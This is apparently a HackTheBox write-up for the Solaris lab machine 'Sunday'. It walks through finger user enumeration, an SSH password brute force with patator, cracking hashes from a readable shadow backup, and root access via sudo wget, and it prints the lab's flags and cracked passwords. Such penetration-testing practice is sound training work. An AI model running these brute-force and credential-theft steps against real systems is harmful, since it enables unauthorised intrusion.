---
title: HackTheBox - Sunday
date: 2021-01-04 12:13:03 +0100
categories: [Hackthebox walkthroughs, Linux, Easy]
tags: [htb-linux-easy, Solaris, SunOS, finger, guessing, patator, hashcat, sudo misconfiguration, GTFOBins, wget, writeup, oscp-prep]
image: https://amirr0r.github.io/assets/img/htb/machines/linux/easy/sunday/Sunday.png
---

## Foothold

### `nmap` scan

```
$ nmap -min-rate 5000 --max-retries 1 -sV -sC -p- -oN Sunday-full-port-scan.txt 10.10.10.76
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-04 09:27 CET
Warning: 10.10.10.76 giving up on port because retransmission cap hit (1).
Stats: 0:00:06 elapsed; 0 hosts completed (1 up), 1 undergoing SYN Stealth Scan
SYN Stealth Scan Timing: About 20.79% done; ETC: 09:27 (0:00:19 remaining)
Nmap scan report for 10.10.10.76
Host is up (0.11s latency).
Not shown: 64580 filtered ports, 950 closed ports
PORT      STATE SERVICE VERSION
79/tcp    open  finger  Sun Solaris fingerd
|_finger: No one logged on\x0D
111/tcp   open  rpcbind 2-4 (RPC #100000)
22022/tcp open  ssh     SunSSH 1.3 (protocol 2.0)
| ssh-hostkey: 
|   1024 d2:e5:cb:bd:33:c7:01:31:0b:3c:63:d9:82:d9:f1:4e (DSA)
|_  1024 e4:2c:80:62:cf:15:17:79:ff:72:9d:df:8b:a6:c9:ac (RSA)
41462/tcp open  unknown
49906/tcp open  unknown
Service Info: OS: Solaris; CPE: cpe:/o:sun:sunos
```

### finger (port 79)

We can use pentestmonkey's script [finger-user-enum.pl](https://raw.githubusercontent.com/pentestmonkey/finger-user-enum/master/finger-user-enum.pl) to do our enumeration:

![finger users top usernames](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/sunday/finger-users.png)

Okay, we know there iis at least 5 users:

1. **root**
2. **admin**
3. **adm**
4. **mysql**
5. **user**

While figuring out what to do next on [Hacktricks - pentesting finger](https://book.hacktricks.xyz/pentesting/pentesting-finger), I ran `finger-user-enum.pl` a second time with a bigger wordlist:

> We could also use **metasploit** with `use auxiliary/scanner/finger/finger_users`.

```bash
$ ./finger-user-enum.pl -U /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames-dup.txt -t $TARGET
```

![finger users more usernames](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/sunday/finger-users-2.png)

From the screenshot above, we can notice tree things:

1. We got more valid usernames
2. The user `sunny` seems to have been connected from a remote IP address `10.10.10.4`
3. The user `root` seems to have been connected from the local machine `sunday`

### SSH (port 22022)

#### Bruteforce old SSH with `patator`

Probably due to an exchange algorithm error, we'll use `patator` instead of using `hydra` to bruteforce ssh.

```bash
$ patator ssh_login host=$TARGET port=22022 user=sunny password=FILE0 0=/usr/share/wordlists/seclists/Passwords/probable-v2-top1575.txt persistent=0 -x ignore:mesg='Authentication failed
.' --timeout=5
```

Valid credentials found/guessed:
- **username**: `sunny`
- **password**: `sunday`

## User (sunny)

```bash
$ ssh -p 22022 sunny@$TARGET
Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

$ ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -p 22022 sunny@$TARGET
The authenticity of host '[10.10.10.76]:22022 ([10.10.10.76]:22022)' can't be established.
RSA key fingerprint is SHA256:TmRO9yKIj8Rr/KJIZFXEVswWZB/hic/jAHr78xGp+YU.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '[10.10.10.76]:22022' (RSA) to the list of known hosts.
Password: 
Last login: Tue Apr 24 10:48:11 2018 from 10.10.14.4
Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008
sunny@sunday:~$ 
```

There is another user called `sammy` who has a home directory:

```bash
sunny@sunday:~$ cd ..
sunny@sunday:/export/home$ ls -la
total 8
drwxr-xr-x  4 root  root   4 2018-04-15 20:18 .
drwxr-xr-x  3 root  root   3 2018-04-15 19:44 ..
drwxr-xr-x 18 sammy staff 27 2020-07-31 18:00 sammy
drwxr-xr-x 18 sunny other 30 2018-04-15 20:52 sunny
```

Let's run `sudo -l`:

```bash
sunny@sunday:/tmp$ sudo -l
User sunny may run the following commands on this host:
    (root) NOPASSWD: /root/troll
```

Since we can only execute it, I will not spend time on it _(for the moment)_.

On `/`, there is `backup` directory which we have access to:

```bash
sunny@sunday:/tmp$ cd /backup
sunny@sunday:/backup$ ls -la
total 5
drwxr-xr-x  2 root root   4 2018-04-15 20:44 .
drwxr-xr-x 26 root root  27 2020-07-31 17:59 ..
-r-x--x--x  1 root root  53 2018-04-24 10:35 agent22.backup
-rw-r--r--  1 root root 319 2018-04-15 20:44 shadow.backup
sunny@sunday:/backup$ cat shadow.backup
mysql:NP:::::::
openldap:*LK*:::::::
webservd:*LK*:::::::
postgres:NP:::::::
svctag:*LK*:6445::::::
nobody:*LK*:6445::::::
noaccess:*LK*:6445::::::
nobody4:*LK*:6445::::::
sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::
sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636:::::
```

> `$5$` is for SHA-256 hash.

###  "Cracking" sammy's password with `hashcat`

According to the manpage of `hashcat`, **7400** is SHA-256 mode:

![74400 sha256 unix](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/sunday/man-hashcat.png)

![hashcat](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/sunday/hashcat.png)

Sammy's password is `cooldude!`.

## User (sammy)

![sammy ssh](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/sunday/sammy-ssh.png)

- flag:

```bash
sammy@sunday:~$ cd Desktop
sammy@sunday:~/Desktop$ cat user.txt
a3d9498027ca5187ba1793943ee8a598
```

- `sudo -l`:

```bash
sammy@sunday:~/Desktop$ sudo -l
User sammy may run the following commands on this host:
    (root) NOPASSWD: /usr/bin/wget
sammy@sunday:~/Desktop$
```

Let's check `wget` on [GTFOBins - wget](https://gtfobins.github.io/gtfobins/wget/) to see how we can privesc:

![wget gtfobins](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/sunday/wget-gtfobins.png)

We cannot use it to privesc! 

Even if we can download a malicious file and then execute it, it will not be done as **root** but as **sammy**. This is because of the pipe  (`|`) as you can see on the image below:

![reverse shell failed](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/sunday/reverse-shell-failed.png)

However there are other things that we can probably do.

1. We can **read** every file: 

![/etc/shadow](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/sunday/etc-shadow.png)

2. We can **overwrite** the `/root/troll` binary

## Root

![root](https://amirr0r.github.io/assets/img/htb/machines/linux/easy/sunday/root.png)

- flag:

```bash
root@sunday:~# cd /root
root@sunday:/root# cat root.txt
fb40fab61d99d37536daeec0d97af9b8
```
___

## Useful links

- [pentestmokey - finger enum](https://github.com/pentestmonkey/finger-user-enum)
- [hacktricks - pentesting finger](https://book.hacktricks.xyz/pentesting/pentesting-finger)
- [Hashcat - example hashes](https://hashcat.net/wiki/doku.php?id=example_hashes)